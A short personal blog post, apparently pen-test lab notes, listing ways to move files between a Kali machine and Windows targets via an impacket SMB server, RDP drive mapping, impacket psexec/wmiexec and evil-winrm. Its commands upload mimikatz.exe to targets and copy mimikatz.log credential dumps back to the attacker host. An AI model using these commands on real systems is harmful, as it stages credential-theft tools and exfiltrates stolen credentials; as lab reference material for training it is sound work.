---
layout: post
title: Windows to Linux File Transfers
---

Transferring files from windows to linux can be annoying. Anyway you do it requires remembering some command line optinos for whatever tool you're using, which is why this post is being made as a reference for myself.

Here are the methods:

## SMB: 
Start server on linux:
```
$ impacket-smbserver test . -smb2support  -username kourosh -password kourosh
```

then in powershell:
```
$ net use m: \\Kali_IP\test /user:kourosh kourosh
$ copy mimikatz.log m:\
```

## RDP mounting shared folder
### xfreerdp
linux:
```bash
$ xfreerdp /cert-ignore /compression /auto-reconnect /u:
offsec /p:lab /v:192.168.212.250 /w:1600 /h:800 /drive:test,/home/kali/Documents/pen-
200
```

windows:
```powershell
copy mimikatz.log \\tsclient\test\mimikatz.log
```

### rdesktop

on linux: 
```bash
rdesktop -z -P -x m -u offsec -p lab 192.168.212.250 -r disk:test=/home/kali/Documents/pen-200
```

on windows:
```powershell
copy mimikatz.log \\tsclient\test\mimikatz.log
```

## Impacket tools
> `psexec` and `wmiexec` are shipped with built in feature for file transfer.

> **Note**: By default whether you upload (lput) or download (lget) a file, it'll be writte in `C:\Windows` path.

Uploading mimikatz.exe to the target machine:

```
C:\Windows\system32> lput mimikatz.exe
[*] Uploading mimikatz.exe to ADMIN$\/
C:\Windows\system32> cd C:\windows
C:\Windows> dir /b mimikatz.exe
mimikatz.exe
```

Downloading mimikatz.log:

```bash
C:\Windows> lget mimikatz.log
[*] Downloading ADMIN$\mimikatz.log
```

## Evil-winrm

Uploading files:
```bash
upload mimikatz.exe C:\windows\tasks\mimikatz.exe
```

Downloading files:
```bash
download mimikatz.log /home/kali/Documents/pen-200
```
